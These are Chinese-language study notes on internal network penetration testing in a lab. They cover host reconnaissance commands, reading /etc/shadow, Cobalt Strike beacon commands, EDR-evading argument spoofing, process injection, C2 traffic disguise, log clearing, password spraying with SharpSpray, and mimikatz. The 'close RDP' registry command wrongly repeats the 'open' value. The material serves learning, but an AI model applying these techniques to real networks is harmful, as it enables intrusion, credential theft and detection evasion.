# 内网渗透

学习思路：https://www.bilibili.com/list/282616786?sid=2262497&spm_id_from=333.999.0.0&desc=1&oid=521614687&bvid=BV16M411m7Jg

## 什么是内网渗透

内网渗透本质与我们常见的渗透没有太多区别，内网外网是相对的，渗透思路和公网渗透类似，但是内网也有内网的特点。这些特点就是我们要学习的，不要被内网渗透迷惑了，**渗透的本质是不变的。**



## 内网组成

-   路由器
-   服务器
-   打印机
-   交换机
-   k8s集群
-   Openstack
-   Linux系统
-   MacOS系统
-   Windows系统
-   Windows AD域



## 内网渗透思路

-   公网->内网
-   信息搜集
-   漏洞扫描
-   漏洞挖掘
-   漏洞利用
-   开始攻击
-   权限维持
-   权限提升
-   横向移动



## 内网渗透工具

-   msf，metasploit；
-   cs，cobalt strike；



## Windows信息收集

### 用户信息

-   用户名称

    ```
    net user 查看当前用户名称
    whoami 查看当前用户名称 
    quser（query user） 查看当前用户名称
    wmic useraccount get /ALL /format:csv
    ```

-   用户权限

    ```
    net localgroup administrators
    ```




WMIC是扩展WMI（Windows Management Instrumentation，Windows管理规范），提供了从命令行接口和批命令脚本执行系统管理的支持。在WMIC出现之前，如果要管理WMI系统，必须使用一些专门的WMI应用，比如SMS，或者使用WMI的脚本编程API，或者使用象CIM Studio之类的工具。如果不熟悉C++之类的 [编程语言](http://baike.baidu.com/view/552871.htm)或VBScript之类的 [脚本语言](http://baike.baidu.com/view/76320.htm)，或者不掌握WMI [名称空间](http://baike.baidu.com/view/94227.htm)的基本知识，要使用WMI管理系统是很困难的。WMIC改变了这种情况，为WMI [名称空间](http://baike.baidu.com/view/94227.htm)提供了一个强大的、友好的命令行接口。



### 进程信息

-   查看进程

    ```
    tasklist
    taskkill # 杀死进程
    get-process # 需要在powershell命令
    wmic process get caption,executablepath,commandline /format:csv
    ```

-   筛选进程

    ```
    tasklist | findstr "explorer.exe"
    tasklist /fi "ImageName eq explorer.exe"    # 匹配explorer应用程序的镜像名
    tasklist
    get-process | findstr "explorer.exe"
    ```

-   进程端口

    ```
    netstat -ano | findstr "80"
    ```

-   进程内存

    ```
    Dump进程内存，需要用专业的工具，什么工具都行，例如：
    procdump
    ```

-   进程权限

    ```
    设计windows编程知识，后续慢慢学习……
    ```

-   进程模块

    ```
    tasklist /fi "ImageName eq explorer.exe" /m
    ```

-   模块搜索

    ```
    tasklist /fi "MODULES eq capauthz.dll"
    ```



### 系统信息

-   主机名称

    ```
    hostname
    [System.Net.DNS]::GetHostByName($Null)
    ```



### 环境变量

-   查看变量

    ```
    set
    ```

-   设置变量

    ```
    set test=deelmind 一次性
    setx test "deelmind" 永久
    ```



### 系统版本

```
ver 查看当前服务器操作系统版本
systeminfo 查看当前系统版本与补丁信息
```



### 启动信息

-   查看自启动项

    ```
    dir "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"
    ```



### 计划任务

```
schtasks /query  查看计划任务
```



### 后缀信息

-   查看文件关联

    ```
    assoc .txt
    ftype | findstr txt
    ```



### 注册表项

-   开启3389端口

    ```
    REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f
    ```

-   关闭3389端口

    ```
    REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f
    ```



### 域内信息

### 密码信息

### 票据信息

### 服务信息

```
tasklist /svc    # /svc 显示每个进程中主持的服务
sc query         # 查询服务的状态，或枚举服务类型的状态
wmic service list brief
Get-WmiObject win32_service | select PathName
```



### 磁盘信息

### 网络信息

```
ipconfig
arp -a
route print
netstat -anot
Get-NetTCPConnection
```



### 文件信息

### 日志信息

```
eventvwr
```



### 软件信息

```
wmic product get name,version  查看安装软件
```



### 驱动信息

```
DRIVERQUERY /V
```



### 防火墙信息

```
netsh advfirewall firewall
```



### 域基础信息

AD域Powershell帮助文档：https://learn.microsoft.com/en-us/powershell/module/activedirectory/?view=windowsserver2022-ps



-   获取域名

    ```
    systeminfo | findstr /B /C:"Domain"
    wmic computersystem get domain
    Get-WmiObject -Namespace root\cimv2 -Class Win32_ComputerSystem | Select Name, Domain
    ```

-   获取域信息

    ```
    Get-ADDomain   # 域服务器上执行
    Get-ADDomain -Current LoggedOnUser
    ```

-   获取域用户

    ```
     Get-ADUser -LDAPFilter '(!userAccountControl:1.2.840.113556.1.4.803:=2)'
    ```

-   获取域计算机

    ```
    Get-ADComputer -Filter *
    ```

-   获取域组信息

    ```
    Get-ADComputer -Filter *
    ```

-   获取域共享信息

    ```
    Get-ADComputer -Filter *
    ```



## Linux信息收集

### 用户信息

```
whoami
who/w
id
finger
cat /etc/passwd
cat /etc/shadow
cat /etc/gshadow
cat /etc/group
```



### 进程信息

-   进程信息

    ```
    ps aux
    ps -efl
    top
    pstree -aup
    ```

-   端口进程

    ```
    sudo lsof -i:22
    sudo netstat -tunlp | grep 53
    ```

-   关闭进程

    ```
    kill -9 PID
    ```



### 系统信息

-   主机名称

    ```
    uname -a
    ```

-   内核版本

    ```
    uname -srm
    hostnamectl
    hostnamectl | grep -i kernel
    cat /proc/version
    ```

-   CPU信息

    ```
    lscpu
    cat /proc/cpuinfo
    ```

-   内存信息

    ```
    free -m -w
    cat /proc/meminfo
    ```

-   环境变量

    ```
    set
    ```



### 启动信息

### 计划任务

```
schtasks
```



### 密码信息

-   查看用户密码

    ```
    cat /etc/passwd
    cat /etc/shadow
    ```



### 票据信息

### 磁盘信息

### 网络信息

-   查看网卡信息

    ```
    ifconfig
    ```

-   查看host信息

    ```
    cat /etc/hosts
    ```

-   查看网卡信息

    ```
    ifconfig
    arp -a
    route print
    netstat -anot
    Get-NetTCPConnection
    ```



### 文件信息

### 服务信息

### 日志信息

### 软件信息

### 驱动信息

### 后缀信息

### 注册表信息

### 防火墙信息



## 信息收集小结



## cs使用

```shell
? cmd   # 查看命令的用法
Beacon Commands
===============

    Command                   Description
    -------                   -----------
    !                         运行历史命令
    argue                     命令行参数欺骗
    blockdlls                 禁止子进程加载非微软签名的dll，通常是为了让木马更加的隐蔽，防止杀软杀掉。
    browserpivot              注入浏览器进程代理用户已认证身份（仅支持IE）
    cancel                    取消正在下载的文件
    cd                        跳转目录
    checkin                   强制目标回连并更新状态（用于DNS上线，DNS模式下无新任务时目标不会回连Teamserver）
    chromedump                提取Chrome保存的账号密码、Cookies等信息
    clear                     清空beacon任务队列
    connect                   通过TCP正向连接远程Beacon
    covertvpn                 部署Covert VPN客户端
    cp                        复制文件
    dcsync                    从域控提取密码hash
    desktop                   远程VNC控制用户桌面
    dllinject                 注入一个内存反射加载的dll到目标进程
    dllload                   使用LoadLibrary()在目标进程中加载一个dll
    download                  下载文件
    downloads                 列出所有正在下载的文件
    drives                    列出所有磁盘盘符
    elevate                   利用提权漏洞获取一个高权限Beacon
    execute                   在目标上执行程序（无回显）
    execute-assembly          在目标上内存加载执行本地.NET程序
    exit                      结束当前Beacon会话
    getprivs                  在当前进程访问令牌（access token）中启用system特权
    getsystem                 尝试获取SYSTEM用户权限
    getuid                    获取当前进程访问令牌（access token）的用户信息
    hashdump                  获取本地用户hash
    help                      帮助信息
    history                   显示历史命令记录
    inject                    在指定进程中注入新的Beacon会话
    inline-execute            在当前会话中执行Beacon Object File
    jobkill                   结束一个后台任务
    jobs                      列出所有后台任务
    jump                      在远程机器上植入Beacon（横向移动）
    kerberos_ccache_use       从ccache文件导入kerberos票据到当前会话中
    kerberos_ticket_purge     清空当前会话中的所有kerberos票据
    kerberos_ticket_use       从ticket文件中导入kerberos票据到当前会话中
    keylogger                 开启键盘记录
    kill                      结束指定进程
    link                      通过命名管道正向连接远程Beacon
    logonpasswords            使用mimikatz获取密码和hash
    ls                        列出目录文件
    make_token                创建进程访问令牌（access token），仅用于访问网络资源
    mimikatz                  运行mimikatz
    mkdir                     创建目录
    mode dns                  使用DNS A记录作为数据通道（仅支持DNS上线Beacon）
    mode dns-txt              使用DNS TXT记录作为数据通道（仅支持DNS上线Beacon）
    mode dns6                 使用DNS AAAA记录作为数据通道（仅支持DNS上线Beacon）
    mv                        移动文件
    net                       网络和主机探测工具（内置net命令）
    note                      给当前会话添加备注信息
    portscan                  网络端口扫描
    powerpick                 内存执行Powershell命令（不调用powershell.exe）
    powershell                通过powershell.exe执行Powershell命令
    powershell-import         导入本地powershell脚本到当前会话中
    ppid                      为所有新运行的进程设置伪造的父进程PID
    printscreen               使用PrintScr方式截屏
    ps                        显示进程列表
    psinject                  注入到指定进程后在内存中执行Powershell命令（不调用powershell.exe)
    pth                       使用Mimikatz执行Pass-the-hash
    pwd                       显示当前目录
    reg                       查询注册表
    remote-exec               在远程机器上执行命令（横向移动）
    rev2self                  恢复原始进程访问令牌（access token）
    rm                        删除文件或文件夹
    rportfwd                  反向端口转发（从Cobalt Strike Teamserver发起连接）
    rportfwd_local            反向端口转发（从Cobalt Strike客户端发起连接）
    run                       在目标上执行程序（有回显）
    runas                     以另一个用户身份执行程序
    runasadmin                以高权限执行程序
    runu                      以另一个进程PID作为父进程PID，并以其用户身份执行程序
    screenshot                截屏
    screenwatch               屏幕监控，每隔一段时间截屏
    setenv                    设置环境变量
    shell                     使用cmd.exe执行命令
    shinject                  注入shellcode到指定进程中
    shspawn                   创建傀儡进程并注入shellcode到其中运行
    sleep                     设置beacon回连间隔时间
    socks                     启动SOCKS4a代理服务器
    socks stop                停止SOCKS4a代理服务器
    spawn                     创建一个新Beacon会话
    spawnas                   以另一个用户身份创建一个新Beacon会话
    spawnto                   设置创建新进程时使用的可执行文件路径（傀儡进程的宿主exe文件路径）
    spawnu                    以另一个进程PID作为父进程PID，并以其用户身份创建一个新Beacon会话
    spunnel                   运行第三方agent shellcode并将其反向代理到控制端（从Cobalt Strike Teamserver发起连接）
    spunnel_local             运行第三方agent shellcode并将其反向代理到控制端（从Cobalt Strike客户端发起连接）
    ssh                       通过SSH连接远程主机（使用账号密码认证）
    ssh-key                   通过SSH连接远程主机（使用证书私钥认证）
    steal_token               从指定进程中窃取访问令牌（access token)
    timestomp                 复制B文件的创建、访问、修改时间戳到A文件（文件时间戳伪造）
    unlink                    断开与beacon的连接（用于通过TCP、命名管道连接的beacon）
    upload                    上传文件
```



### argue参数欺骗

为什么要使用这个东西？使用这个命令可以对一些关键性的powershell命令攻击进行隐藏。



在没有采用参数欺骗时，如果在cs命令行输入一下命令时，使用windows process monitor工具捕获的命令为：

```
run powershell 2+2
```

![image-20230315134257560](.\内网渗透.assets\image-20230315134257560.png)





cs使用argue命令来进行参数的欺骗，argue使用：

```
beacon> ? argue
Use: argue [命令] [假参数]
     argue [命令]
     argue

当Beacon启动 [命令] 进程时，设置其命令行参数为 [假参数]，用于欺骗EDR等软件采集到的命令行参数
这个选项不会影响 runu/spawnu、 runas/spawnas 以及 post-ex 任务

使用 "argue [命令]" 来禁用针对特定 [命令] 的参数伪装功能

单独输入 "argue" 可以列出所有定义了命令行参数伪装的程序
```

方法：

1、确定要欺骗的命令，这里对powershell进行欺骗，骗其执行的命令为：

```
argue powershell insideNetwork
```

![image-20230315134831154](.\内网渗透.assets\image-20230315134831154.png)

2、使用process monitor抓取到的命令为：

![image-20230315134756328](.\内网渗透.assets\image-20230315134756328.png)





### dllinject/dllload/inject/psinject/shinject

dllinject：注入一个内存反射加载的dll到目标进程

dllload：使用LoadLibrary()在目标进程中加载一个dll

```
dllload 6320 C:\Users\vagrant\Desktop\inject.dll
```

inject：在指定进程中注入新的Beacon会话

```
inject [pid] <x86|x64> [监听器]
```

psinject： 注入到指定进程后在内存中执行Powershell命令（不调用powershell.exe)

```
psinject [pid] [x86|x64] [cmdlet] [参数]
```

shinject：注入shellcode到指定进程中

```
shinject [pid] <x86|x64> [/本地绝对路径/my.bin]  # [] 表示一定需要加值，<>表示可选
```





### exec cmd

1、run命令

```
run：在目标上执行程序（有回显）
run [程序] [参数]
```

2、remote-exec

```
remote-exec：在远程机器上执行命令（横向移动）

beacon> ? remote-exec
Use: remote-exec [方法] [目标] [命令]

使用指定的 [方法] 在 [目标] 上执行 [命令]

单独输入 "remote-exec" 可以查看 [方法] 列表
beacon> remote-exec

Beacon Remote Execute Methods
=============================

    Methods                         Description
    -------                         -----------
    psexec                          Remote execute via Service Control Manager
    winrm                           Remote execute via WinRM (PowerShell)
    wmi                             Remote execute via WMI
```

3、shell

```
shell：使用cmd.exe执行命令
shell [命令] [参数]
```



### 漏洞扫描

windows-kernel-exploits：https://github.com/SecWiki/windows-kernel-exploits

可以直接使用systeminfo命令获取系统关键信息，然后使用极光无线进行扫描：https://detect.secwx.com/



### 提权漏洞

```
getprivs：在当前进程访问令牌（access token）中启用system特权
getsystem：尝试获取SYSTEM用户权限
getuid：获取当前进程访问令牌（access token）的用户信息
```

如果以上命令执行提权失败，这时可以尝试使用这个插件进行权限的提升操作。

cs插件：https://github.com/pandasec888/taowu-cobalt-strike



### spawn【寄生】

1、spawn

```
Use: spawn [x86|x64] [监听器]
     spawn [监听器]

创建一个x86或x64傀儡进程，并注入运行从 [监听器] 生成的shellcode
```

```
spawn t2   # 使用监听器t2
```



2、spawnto

```
Use: spawnto [x86|x64] [c:\目标上路径\whatever.exe]

设置Beacon创建傀儡进程时使用的可执行文件路径，必须指定完整路径
支持使用环境变量（例如％windir％\sysnative\rundll32.exe）

请勿直接使用 "%windir%\system32\"，该路径会根据Beacon是x86还是x64而解析成不同的绝对路径
x64请使用 "%windir%\sysnative\"
x86请使用 "%windir%\syswow64\"

当WOW64不存在时，Beacon将会把 "%windir%\syswow64\" 映射到 system32
```



3、spawnu

```
Use: spawnu [pid] [监听器]

尝试以指定 [pid] 为父程序来创建Beacon会话。该Beacon会话将以指定的 [pid] 进程的用户身份运行

spawnu 768 t2 # 注入到768进程中
```

![image-20230316100524483](.\内网渗透.assets\image-20230316100524483.png)





### TCP&SMB Pipe

即通过TCP管道进行连接，在cs中，这个属于stageless，直接配置好端口即可生成对应的木马文件，然后再使用cs自带的命令connect进行正向连接。

```
Use: connect [目标]
     connect [目标] [端口]

连接TCP Beacon并建立控制通道。所有对于TCP Beacon的命令请求都将通过当前Beacon会话

使用 "unlink" 命令来断开TCP Beacon
```

![image-20230316124725564](.\内网渗透.assets\image-20230316124725564.png)



**link**

```
Use: link [目标] [管道名]
     link [目标]

连接SMB Beacon并建立控制通道，所有对于SMB Beacon的命令请求都将通过当前Beacon会话可以指定一个显式的 [管道名] 以连接到特定管道。否则，将使用当前配置文件中的默认管道名
```

1、首先创建一个smb监听器；

2、创建连接

```
link 127.0.0.1 msagent_f1
```

![image-20230316130026222](.\内网渗透.assets\image-20230316130026222.png)



### C2

C2是control & command的缩写，通常有cc、c2 server（是给被控制电脑下发的指令）、c2这些简称。



### Foreign HTTP(S)

这个payload通常用来联动msf，即真正的stager是从我们指定的msf监听的ip地址服务上面下载的。这样stager就是msf的，即cs即可与msf联动。

![image-20230316132707508](.\内网渗透.assets\image-20230316132707508.png)

![image-20230316132728763](.\内网渗透.assets\image-20230316132728763.png)



配置好监听器之后，使用cs生成包含foreign http监听器的后门，在运行该后门之后，msf监听端即可收到meterpreter。





### 痕迹清理

首先要知道对方机器记录了什么日志，我们才能够去针对性的尝试删除掉那些日志；跟免杀一个道理，首先我们要知道对方式为什么能够免杀我们，我们才能够针对这个点进行绕过。

查看日志可以到windows日志管理器里面去查看；计算机>管理>日志管理



CobaltStrike后渗透测试插件：https://github.com/DeEpinGh0st/Erebus

Cobalt Strike插件 - RDP日志取证&清除：https://github.com/QAX-A-Team/EventLogMaster



### 横向移动

cs插件：https://github.com/d3ckx1/OLa





### 工具自动化

```
post/windows/gather/enum_av  # 枚举已经安装的杀软
port/windows/gather/checkvm  # 检查是否为虚拟机
```

在信息收集的时候，由于要处理的东西太多了，这里可以利用工具自动化进行收集。





### 端口转发

matesploit meterpreter进行端口的转发：

```
Usage: portfwd [-h] [add | delete | list | flush] [args]


OPTIONS:

    -i   Index of the port forward entry to interact with (see the "list" command).
    -l   Forward: local port to listen on. Reverse: local port to connect to.
    -L   Forward: local host to listen on (optional). Reverse: local host to connect to.
    -p   Forward: remote port to connect to. Reverse: remote port to listen on.
    -r   Forward: remote host to connect to.
    -R   Indicates a reverse port forward.
    
    
portfwd add -l 6666 -p 8000 -r 192.168.10.242 # 将内网192.168.10.242电脑的8000端口流量转发到本地6666端口
```



任何端口转发工具的本质都具有三个关键参数，-l 本地绑定的端口、-p被转发主机的端口、-r被转发的主机。这三个参数是任何端口转发的关键，任何其他的端口转发工具可能只是在这上面进行一个其它小点的扩展，比如转发的协议等。



### 内网渗透

```ruby
Vagrant.configure("2") do |config|
  INNER_COUNT = 2
  IMAGE_NAME = "insidePermeate"
  MEMORY_SIZE_IN_GB = 2
  CPU_COUNT = 1
  #config.vm.define "insidePermeate"
  config.vm.box = IMAGE_NAME
  config.vm.provider "virtualbox" do |vb|
  	vb.memory = 1024 * MEMORY_SIZE_IN_GB
  	vb.cpus = CPU_COUNT
  end
  
  config.vm.define "victima" do |victima|
  	victima_node_ip = "10.0.2.20"
  	victima.vm.network "private_network", ip: "#{victima_node_ip}"
  	victima.vm.network "public_network", ip: "192.168.10.233", bridge: "Intel(R) Wireless-AC 9560 160MHz"
  	victima.vm.hostname = "victima"
  	config.vm.communicator = "winrm"
  	config.vm.synced_folder "I://vagrant-vm-share", "C://share"
  	config.vm.network "forwarded_port", guest:3389, host:53389,auto_correct: true
  	config.vm.network :forwarded_port, guest:22, host:3322, auto_correct: true
  end
  
  config.vm.define "victimb" do |victimb|
  	victimb_node_ip = "10.0.2.21"
  	victimb.vm.network "private_network", ip: "#{victimb_node_ip}"
  	victimb.vm.hostname = "victimb"
  	config.vm.communicator = "winrm"
  	config.vm.synced_folder "I://vagrant-vm-share", "C://share"
  	config.vm.network "forwarded_port", guest:3389, host:43389,auto_correct: true
  	config.vm.network :forwarded_port, guest:22, host:3422, auto_correct: true
  end
end
```

![image-20230318095935770](.\内网渗透.assets\image-20230318095935770.png)

注：在测试网络连通性的时候不要动不动就使用ping来检测，有时候该命令可能会被防火墙所拦截，导致产生网络不连通的现象；正确是可以弄一个Python web环境测试一下其连通性，命令为：`Python -m http.server`



这里主要是获取到win10电脑的meterpreter之后，就可以使用autoroute命令来获取通往内网win11机器的路由，就可以对win11机器的端口进行扫描了。









### C2 Profile

目的是为了更好的隐藏我们的流量，没有设置任何Profile文件的前提下，CS的流量如下：

![image-20230319103054712](.\内网渗透.assets\image-20230319103054712.png)

在启动CS teamserver的时候可以指定其Profile文件：

```shell
$ sudo ./teamserver 192.168.10.151 pass profile.profile
```



其相关的东西资料：

https://github.com/rsmudge/Malleable-C2-Profiles



使用gmail.profile配置cs之后，这里截取到的流量包就大为不同了。

![image-20230319104952706](.\内网渗透.assets\image-20230319104952706.png)





### msf联动cs

当某一台电脑感染了我们cs的木马之后，我们可以能想进一步的横向扩散，但是cs不支持漏洞的扫描，这时我们可以使用msf中的一些扫描模块，当然这里需要配置相应的代理。



cs拿到一个主机的控制权之后，就可以设置隧道代理配置了，如下：

![image-20230319133824189](.\内网渗透.assets\image-20230319133824189.png)

注：这里的代理是开在cs的server端的。

msf设置如下：

![image-20230319133938060](.\内网渗透.assets\image-20230319133938060.png)

注意：这里的Proxies选项需要使用show advanced进行查看。



要理解这里这个代理的本质，Proxies是在msf当中设置的，所以这个代理设置我们只能在msf当中进行使用；但如果我们想要在msf外面如nmap中使用咋办呢？这时可以使用系统的proxychains进行代理，配置文件如下；

```properties
[ProxyList]
socks4 192.168.10.151 50731
```

使用：

```
Usage:  proxychains -q -f config_file program_name [arguments]
        -q makes proxychains quiet - this overrides the config setting
        -f allows one to manually specify a configfile to use
        for example : proxychains telnet somehost.com
More help in README file
```

```shell
proxychains -f proxychains.config1 nmap 10.110.1.21 -sT -p 3389 -PN
```





### cs插件开发

参考官方文档：https://www.cobaltstrike.com/help-scripting



## 内网防火墙

这里使用pfsense来进行演示，需要注意的是，在访问web管理页面时，输入的是lan口的IP地址。



注：waf与杀软基本是相同的，他们都是匹配一些关键性的字符串，如敏感的函数、系统文件操作、内核操作等；而防火墙则是通过在各个协议上面进行操作的，如端口、特定的协议等。





## Windows Server Manager

使用vagrant搭建winserver2016，需要注意的是，winserver manager本身也只是一个软件而已，只不过这个软件可以管理其它服务的安装，卸载等。



### 安装IIS

选中IIS服务器之后，一路默认就可以了；



## 域内渗透

### **什么是windows域**

[Windows域](https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/get-started/virtual-dc/active-directory-domain-services-overview)，是计算机网络的一种形式，其中所有的用户账户、计算机、打印机和其它网络设备都被域控制器管理，方便管理员管理，配置大量的主机设备。



**域类型**

1、单域

在一个域内，一般至少需要两台域服务器，一台作为DC，一台作为备份DC。

2、域树

![域](.\内网渗透.assets\domain-forest.png)

3、DC域控

域控制器（Domain Control）在域架构中用来管理所有客户端的服务器，是域架构的核心，每个域控制器上都包含了AD活动目录数据库,即安装了AD的服务器就是域控DC。一般内网中存在多个域控，且域控之间可以自动同步信息，从而确保域的安全运行。

4、信任域

5、根域

第一个被创建的域即为根域，一个域树中只能由一个根域，且根域对其他域有最高管理权。



### 域VS工作组

1.  创建方式不同，"工作组"可以由任何一个计算机的主人来创建，而"域"只能由服务器来创建。
2.  安全机制不同，在"域"中有可以登录该域的帐号，这些由域管理员来建立。在"工作组"中不存在组帐号，只有本机上的帐号和密码。
3.  登录方式不同，在工作组方式下，计算机启动后自动就在工作组中。登录"域"是要提交"域用户名"和"密码"，一旦登录，便被赋予相应的权限。
3.  一般来说工作组可能就是一个局域网类的一小个集群，而域环境只要是联网登录就可以。



### 活动目录（Active Directory）

目录是一种层次结构，用于存储有关网络上对象的信息。目录服务（例如 Active Directory 域服务 (AD DS)）提供了存储目录数据并使该数据可供网络用户和管理员使用的方法。例如，AD DS 存储有关用户帐户的信息，例如姓名、密码、电话号码等，并允许同一网络上的其他授权用户访问这些信息。



### LDAP

轻量级目录访问协议（Light Directory Access Portocol】简称：LDAP）



### DC/CN

DC (Domain Component)：域名组件，表示 DNS 域名中的组件

OU (Organizational Unit)：组织单位，可以理解为某一个部门；

CN (Common Name)：通用名称，一般为用户名或计算机名；



### 漏洞列表

https://github.com/infosecn1nja/AD-Attack-Defense





### DC 用户配置

主要是在Active Directory用户和计算机里面进行配置。



### DC用户连接

1、待加入的PC的DNS需要设置为DC服务器的地址；

2、确保这待加入PC能够与DC正常通信；



### 暴力破解

域内用户暴力破解：https://github.com/iomoath/SharpSpray

```
-v      Show verbose messages.
-u      Username list file path. This will be automatically fetched from the active directory if not specified.
-p      A single password that will be used to perform the password spray.
-k --pl Password List file path.
-d      (Optional) Specify a domain name.
-m      Use this option if spraying from a host located outside the Domain context.
-q --dc-ip      Domain Controller IP. Required when the option 'm' OutsideDomain is checked
-x      Attempts to exclude disabled accounts from the user list (Not supported with the option -m)
-z      Exclude accounts within 1 attempt of locking out. (Not supported with the option -m)
-f      Custom LDAP filter for users, e.g. "(description=*admin*)"
-o      A file to output the results to.
-w      Do not rely on domain lockout observation window settings and use this specific value. (Default: 32 minute)
-s      (Optional) Delay in seconds between each authentication attempt.
-j      (Optional) Jitter in seconds.
get-users-list  Get the domain users list from the active directory.
-Force  Force start without asking for confirmation.
--show-examples Show usage examples.
--show-args     Show command line args.


SharpSpray.exe -v -x -z --pl password.txt
SharpSpray.exe -x -z -u users.txt --pl psswd.txt
SharpSpray.exe -x -z -u users.txt -p Passw0rd!
SharpSpray.exe -x -z -s 3 -j 1 -u users.txt -k psswd.txt -o sprayed.txt
SharpSpray.exe -w 32 -d DC-1.local --dc-ip 10.10.20.20 -u users.txt --pl psswd.txt
SharpSpray.exe -w 32 -s 3 -j 1 -d DC-1.local --dc-ip 10.10.20.20 -u users.txt --pl psswd.txt
SharpSpray.exe --get-users-list
SharpSpray.exe --get-users-list > users.txt
SharpSpray.exe --get-users-list | Out-File -Encoding ascii users.txt
```



### Linux加入域环境

1、更改电脑的dns文件

```
nameserver 192.168.10.210
```



2、[下载自动化脚本工具](https://github.com/PierreGode/Linux-Active-Directory-join-script)

运行ADconnect.sh脚本

注：第一次初始化安装的时候一定要使用管理员账户去安装





## SID History攻击

### 什么是[SID History攻击](https://learn.microsoft.com/zh-cn/defender-for-identity/security-assessment-unsecure-sid-history-attribute)

SID 历史是一个支持迁移方案的属性。每个用户帐户都有一个关联的安全标识符 (SID)，用于跟踪安全主体和帐户在连接到资源时的访问权限。SID  历史记录使另一个帐户的访问权限可以有效地克隆到另一个帐户，并且对于确保用户在从一个域移动（迁移）到另一个域时保留访问权限非常有用。权限维持。



获取SID

```
wmic useraccount get name,sid
#### 
Administrator  S-1-5-21-2353069989-2815075995-2277803342-500  # 50表示系统管理员
Guest          S-1-5-21-2353069989-2815075995-2277803342-501
krbtgt         S-1-5-21-2353069989-2815075995-2277803342-502
vagrant        S-1-5-21-2353069989-2815075995-2277803342-1000
usera          S-1-5-21-2353069989-2815075995-2277803342-1104
user1          S-1-5-21-2353069989-2815075995-2277803342-1106


S-1-5-21-1004336348-1177238915-682003330-512
sid（S）
修订级别 (1)
标识符颁发机构（5，NT Authority）
域标识符 (21-1004336348-1177238915-682003330, Contoso)
对标识符（512，Domain Admins）

```



详细了解安全标识符：https://learn.microsoft.com/zh-cn/windows-server/identity/ad-ds/manage/understand-security-identifiers





### SID History攻击前提

### SID History单域攻击过程

### SID History域树攻击过程





## mimikatz

官网：https://github.com/gentilkiwi/mimikatz

wiki：https://github.com/gentilkiwi/mimikatz/wiki

standard模块下常用的命令：

```
log   # 将操作及输出信息保存到log文件当中
```



如何使用mimikatz？在powershell终端进行操作：

```powershell
.\mimikatz.exe

log  # 保存日志，当然也可以在log后面跟上日志文件名，将当前的操作日志保存到改文件中。
```



### lsass进程

lsass（Local Security Authority Subsystem Service）是一个Windows进程，负责处理操作系统的安全策略，例如，当你登录到Windows用户账户或服务器时，lsass.exe会验证登录名和密码。



### SAM

安全帐户管理器(SAM，Security Accounts Manager)是Microsoft Windows操作系统（OS）中的一个数据库文件，其中包含用户名和密码。SAM的主要目的是使系统更加安全，并在系统被盗时防止数据泄露。SAM可用于不同版本的 Windows，包括Windows XP、Windows Vista、Windows 7、Windows 8.1、windows 10和Windows 11。在用户尝试登录期间，Windows 系统将要求输入用户名和密码。输入密码后，将根据SAM中的密码HASH进行验证。如果用户名和相关密码与SAM中的条目匹配，则会发生一系列事件。这最终将导致授予用户访问系统的权限。

```
%SystemRoot%\system32\config\
```



### [MSV](https://learn.microsoft.com/zh-cn/windows/win32/secauthn/msv1-0-authentication-package)&[NTLM](https://learn.microsoft.com/zh-cn/troubleshoot/windows-server/windows-security/ntlm-user-authentication)&[LM](https://learn.microsoft.com/zh-cn/troubleshoot/windows-server/windows-security/prevent-windows-store-lm-hash-password)

**NTLM本地认证流程**

winlogon.exe是Windows NT用户登陆程序，用于管理用户登录和退出,当用户注销、重启、锁屏后，操作系统会让winlogon.exe显示登陆界面,当winlogon.exe接收到账号密码输入之后，会将密码交给lsass进程，将明文密码加密成NTLM Hash，与SAM数据库比较认证。



### DPAPI

DPAPI (Data Protection API)是一种简单的加密应用程序编程接口，可作为Windows 2000和更高版本的Microsoft Windows操作系统中的内置组件使用。理论上，数据保护API可以对任何类型的数据进行对称加密;实际上，它在Windows 操作系统中的主要用途是执行非对称私钥的对称加密，使用用户或系统机密作为熵的重要贡献。

用于加密用户RSA密钥的 DPAPl密钥存储在%APPDATA%\Microsoft\Protect{SID}目录下，其中 {SID}是该用户的安全标识符。DPAPI密钥与保护用户私钥的主密钥存储在同一文件中。它通常是64字节的随机数据。



### DPAPI MasterKey

Vault

>Windows stores credentials in special folders that they call "vaults" to help users login to websites and other computers.





### WDigest

### SSP

### TsPkg





### IPC$

IPC$(Internet Process Connection)是共享"命名管道"的资源，它是为了让进程间通信而开放的命名管道，可以通过验证用户名和密码获得相应的权限在远程管理计算机和查看计算机的共享资源时使用。



### 共享命令

查看共享

```
net share
```

删除共享

```
net use \\127.0.0.1\ipc$ /delete
```

访问共享

```
net use \\127.0.0.1\ipc$ "" /user:""   # ipc空连接
net use \\127.0.0.1\c$ "密码" /user:"用户名"
net use \\127.0.0.1\d$ "密码" /user:"deelmind\usera"
```

复制（上传）执行共享

```
copy file \\127.0.0.1\c$
command \\127.0.0.1\c$\file
```



### 共享文件夹

不同共享，连接方式：在文件资源管理器的快速访问地址栏里面输入：`\\192.168.10.210`；注`\\与//`是不一样的，前面的表示访问共享文件夹或主机的发现，一般走smb协议，而后面一般类似在浏览器当中寻找并请求服务器，一般是http协议；

AD域在“文件和存储服务”里面进行共享：

![image-20230325114809905](C:\Users\friendship\Desktop\MiscTools\Pentest_Interview\内网渗透笔记\内网渗透.assets\image-20230325114809905.png)

![image-20230325114831601](C:\Users\friendship\Desktop\MiscTools\Pentest_Interview\内网渗透笔记\内网渗透.assets\image-20230325114831601.png)

### mimikatz的使用

查看所有的模块

```
fajifajifajifa::   # 随便输入一些字符串再跟上::即可看到所有的模块
```

查看sid模块下的方法

```
sid::
ERROR mimikatz_doLocal ; "(null)" command of "sid" module not found !

Module :        sid
Full name :     Security Identifiers module

          lookup  -  Name or SID lookup
           query  -  Query object by SID or name
          modify  -  Modify object SID of an object
             add  -  Add a SID to sIDHistory of an object
           clear  -  Clear sIDHistory of an object
           patch  -  Patch NTDS Service
```

查看sid的lookup方法的使用

```
mimikatz # sid::lookup
 
 ERROR kuhl_m_sid_lookup ; /sid or /name is missing  # 这里提示缺少参数
 
mimikatz # sid::lookup /name:administrator
Name  : administrator
Type  : User
Domain: DEELMIND
SID   : S-1-5-21-2353069989-2815075995-2277803342-500
```





## [BloodHound](https://github.com/BloodHoundAD/BloodHound)

什么是BloodHound？

BloodHound可视化环境拓扑图



